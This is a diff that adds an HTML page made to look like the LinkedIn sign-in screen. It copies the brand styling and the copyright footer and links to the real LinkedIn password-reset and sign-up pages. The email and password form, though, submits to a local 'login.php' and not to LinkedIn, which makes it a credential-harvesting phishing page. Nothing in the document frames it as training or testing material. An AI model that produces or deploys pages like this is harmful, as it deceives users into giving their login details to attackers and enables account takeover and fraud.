@@ -1,0 +1,107 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In to LinkedIn</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: #f3f2ef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .signin-container {
+      background: white;
+      padding: 32px 36px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 370px;
+      max-width: 90vw;
+    }
+    .logo {
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      color: #0a66c2;
+      margin-bottom: 24px;
+    }
+    .form-field {
+      margin-bottom: 16px;
+    }
+    .form-field label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #666;
+    }
+    .form-field input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background-color: #0a66c2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn-primary:hover {
+      background-color: #004182;
+    }
+    .links {
+      margin-top: 16px;
+      font-size: 14px;
+      text-align: center;
+    }
+    .links a {
+      color: #0a66c2;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="signin-container">
+    <div class="logo">LinkedIn</div>
+    <form action="login.php" method="POST" id="login">
+      <div class="form-field">
+        <label for="username">Email address</label>
+        <input type="text" id="username" name="username" placeholder="Email address" required autocomplete="off" />
+      </div>
+      <div class="form-field">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off" />
+      </div>
+      <button type="submit" class="btn-primary">Sign in</button>
+      <div class="links">
+        <a href="https://www.linkedin.com/uas/request-password-reset" target="_blank">Forgot password?</a><br>
+        <span>Not a member? <a href="https://www.linkedin.com/start/join" target="_blank">Join now</a></span>
+      </div>
+    </form>
+    <footer>
+      &copy; 2025 LinkedIn Corporation
+    </footer>
+  </div>
+</body>
+</html>
